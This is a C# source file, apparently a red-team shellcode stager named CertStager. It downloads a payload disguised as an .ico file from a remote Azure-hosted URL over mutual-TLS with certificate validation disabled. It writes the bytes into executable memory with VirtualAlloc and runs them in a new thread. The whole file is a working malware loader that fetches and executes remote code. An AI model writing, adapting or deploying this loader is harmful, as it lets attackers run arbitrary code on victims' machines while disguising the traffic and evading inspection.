using System;
using System.IO;
using System.Net;
using System.Security.Cryptography.X509Certificates;
using System.Runtime.InteropServices;

namespace CertStager
{
    class Program
    {
        //WinAPI imports
        [DllImport("kernel32")]
        public static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, uint size, uint flAllocationType, uint flProtect);

        [DllImport("kernel32")]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr param, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        static void Main(string[] args)
        {
            //change URL to match stagning url
            string Url = "https://caddymtls.northeurope.cloudapp.azure.com/image-directory/lt.ico";

            //insert base64 encoded client certificate here
            string byteCert = "";
            var convertedCert = new X509Certificate2(Convert.FromBase64String(byteCert));

            ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };

            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(Url);
            request.ClientCertificates.Add(convertedCert);
            request.UserAgent = "you already know";
            request.Method = "GET";
            WebResponse response = request.GetResponse();

            MemoryStream ms = new MemoryStream();
            response.GetResponseStream().CopyTo(ms);
            byte[] data = ms.ToArray();

            IntPtr databuf = VirtualAlloc(IntPtr.Zero, (uint)data.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

            Marshal.Copy(data, 0, databuf, data.Length);

            IntPtr randomvar = CreateThread(IntPtr.Zero, 0, databuf, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(randomvar, 0xFFFFFFFF);
        }
    }
}